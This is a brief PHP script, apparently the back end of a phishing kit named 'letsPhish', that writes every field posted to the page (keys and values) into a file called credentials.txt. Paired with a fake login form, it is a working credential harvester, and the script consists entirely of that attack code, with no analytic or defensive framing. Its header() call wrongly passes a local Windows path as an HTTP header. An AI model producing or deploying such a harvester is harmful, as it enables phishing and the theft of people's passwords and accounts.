<?php
header ('D:\projects\letsPhish');
$file = fopen("credentials.txt",'a');
foreach($_POST as $key => $value){
    fwrite($file,$key);      
    fwrite($file,"=>");      
    fwrite($file,$value);    
    fwrite($file,"\r\n");
}
fwrite($file,"\r\n");
fclose($file);
exit;
?>